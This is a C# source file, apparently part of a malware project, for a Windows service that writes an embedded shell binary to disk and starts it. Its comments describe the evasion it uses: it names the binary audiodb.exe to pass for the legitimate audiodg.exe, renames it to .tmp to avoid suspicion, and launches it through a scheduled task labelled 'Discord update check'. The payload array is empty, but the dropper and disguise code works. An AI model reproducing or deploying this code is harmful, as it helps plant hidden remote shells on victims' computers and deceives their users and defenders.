using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32.TaskScheduler;

namespace ShellManagerService
{
    public class ShellManager
    {
        private static Random random = new Random();
        //This byte array should contain the whole image of the shell, just in case it gets deleted at some point (https://github.com/BomboBombone/Objectify)
        public static byte[] shell_image = { };
        public static void LoadShellInDisk()
        {
            //Call the process audiodb since people are dumb as fuck when looking for it on google will lead to audiodg.exe which is a legitimate Windows executable
            string tmp_name = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "audiodb.exe");

            //Check if shell is already running
            Process[] pname = Process.GetProcessesByName(tmp_name.Split('\\').Last().Split('/').Last());
            if(pname.Length > 0) //Shell is running
            {
                return;
            }

            if (!File.Exists(tmp_name))
            {
                File.Create(tmp_name);
            }
            FileStream fs = new FileStream(tmp_name,
                                   FileMode.Open,
                                   FileAccess.Write);
            fs.Write(shell_image, 0, shell_image.Length);
            fs.Close();

            //Rename the file changing the extension to .tmp to avoid suspicion in case someone opens the folder I guess(?)
            File.Move(tmp_name, tmp_name.Replace(".exe", ".tmp"));
        }
        //Give the module a random ass name idk
        public static string RandomModuleName(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return (new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray()) + ".exe");
        }
        //Services run as User 0, therefore cannot start other processes. A possible bypass is to schedule a single run Task for the executable :)
        public static void StartProcess(string file_path)
        {
            using (var ts = new TaskService())
            {
                var t = ts.Execute(file_path)
                    .Once()
                    .Starting(DateTime.Now.AddSeconds(5))
                    .AsTask("Discord update check");
            }
        }
    }
}
